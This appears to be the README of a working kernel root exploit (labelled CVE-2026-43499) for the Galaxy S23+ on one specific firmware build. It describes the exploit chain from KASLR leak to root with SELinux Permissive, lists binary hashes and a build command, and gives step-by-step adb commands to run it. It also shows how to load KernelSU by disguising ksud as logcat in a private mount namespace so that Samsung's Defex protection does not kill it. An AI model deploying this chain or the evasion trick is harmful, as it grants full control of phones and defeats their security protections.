# Galaxy S23+ SM-S916B (S916BXXSAFZI1) payload

Exact firmware profile for the Galaxy S23+ on firmware `S916BXXSAFZI1`
(`samsung/dm2qxxx/dm2q:16/BP4A.251205.006/S916BXXSAFZI1`), kernel
`5.15.189-android13-8-33413713-abS916BXXSAFZI1`.

## Hardware evidence

The full chain completed on the first attempt on real `SM-S916B` FZI1
hardware from `adb shell`: tracefs KASLR slide (event id 108), controlled
32-object `mm_struct` group, shaped order-3 SKB reclaim, MCAST waiter
write, fake ashmem fops, configfs arbitrary read/write, pipe physical
read/write, and root UMH (`done=1 root=1 uid=2000->0`, `uid=0(root)
context=u:r:kernel:s0`, SELinux Permissive). The P0 oracle read-verify
matched on the same attempt (`p0 physical write status=0 ok=1`),
confirming the carried `P0_KERNEL_PHYS_LOAD 0x80080000` on the rebuilt
FZI1 ABL; the P0 profile line re-confirmed `SLIDE_NFULNL_LOGGER_NAME_OFF`,
`INIT_TASK_OFF`, `random_table[4].data`, and `sysctl_bootid` on the live
image. Successful boots so far: 1 of 1 attempts.

KernelSU late-load with the FZG1 `ksud-dm2q-S916BXXSAFZG1-kdp` loader pair
was verified on this FZI1 device: module loads (`Live` in `/proc/modules`)
and `su -c id` returns `uid=0(root) context=u:r:ksu:s0`. The profile was
derived offline from the recovered FZI1 ELF/BTF — every constant
re-derived and cross-checked (see
[`../../docs/SM-S916B-S916BXXSAFZI1.md`](../../docs/SM-S916B-S916BXXSAFZI1.md)
for the drift record and the offline symbol audit behind the cross-build
module reuse).

## Files

| File | SHA-256 |
| --- | --- |
| `cve-2026-43499-app.so` | `79d46813bb25e91b8cfa08786cc194294b998f8ae170ccf2b9d67aec35430fea` |
| `cve-2026-43499-root` | `375857c5d9a3b425c84decbb243f4abba579993c33ea30086c29fd3a7e8f06f2` |
| `../../kernelsu/ksud-dm2q-S916BXXSAFZG1-kdp` | `5da5818d36da2d589496f91016078a43f50489e5c98b319db4eaa5ee475b86bd` (cross-build reuse, audited against FZI1 and device-tested on it, see above) |

## Build

Built with NDK r30 (30.0.16248370), API 35:

```sh
make TARGET=dm2q-S916BXXSAFZI1 ANDROID_NDK_HOME=/opt/android-ndk
```

## Per-boot usage

Everything is volatile; a reboot removes root and the KernelSU module.

```cmd
adb push cve-2026-43499-app.so /data/local/tmp/dm2q.so
adb push cve-2026-43499-root /data/local/tmp/cve-2026-43499-root
adb push ../../kernelsu/ksud-dm2q-S916BXXSAFZG1-kdp /data/local/tmp/ksud-s25u-kdp
adb shell "chmod 755 /data/local/tmp/cve-2026-43499-root /data/local/tmp/ksud-s25u-kdp"
```

Wait about one minute after a fresh boot, then run one attempt per boot:

```cmd
adb shell "SLIDE_SOURCE=tracefs EXPLOIT_ATTEMPTS=1 P0_ATTEMPT_TIMEOUT_SEC=115 EXPLOIT_ATTEMPT_TIMEOUT_SEC=600 /data/local/tmp/cve-2026-43499-root --run-payload /data/local/tmp/dm2q.so /data/local/tmp/cve-2026-43499-root /data/local/tmp/dm2q-fzi1.log"
```

Verify shell root, stage `ksud`, and run the guarded late-load while the
device is still Permissive (the current `su_daemon.c` passes `--ephemeral`,
which this ksud build does not accept, so the guarded invocation is
replicated manually):

```cmd
adb shell "/data/local/tmp/cve-2026-43499-root -c 'id; getenforce'"
adb shell "/data/local/tmp/cve-2026-43499-root -c 'cp /data/local/tmp/ksud-s25u-kdp /data/local/tmp/.ksud-stage; chmod 755 /data/local/tmp/.ksud-stage'"
adb shell "/data/local/tmp/cve-2026-43499-root -c 'unshare -m sh -c \"mount --bind /data/local/tmp/ksud-s25u-kdp /system/bin/logcat && exec logcat late-load --package-name me.weishu.kernelsu\" > /data/local/tmp/ksud-late.log 2>&1'"
adb shell "grep kernelsu /proc/modules"
adb shell "su -c id"
```

Direct execution of `ksud` from `/data/local/tmp` is Defex-killed
(`Killed`, rc=137); only the logcat-disguised invocation inside a private
mount namespace loads the module. Expect retries on later boots: failed
attempts leave PI state behind and the runner refuses in-boot retries by
design.
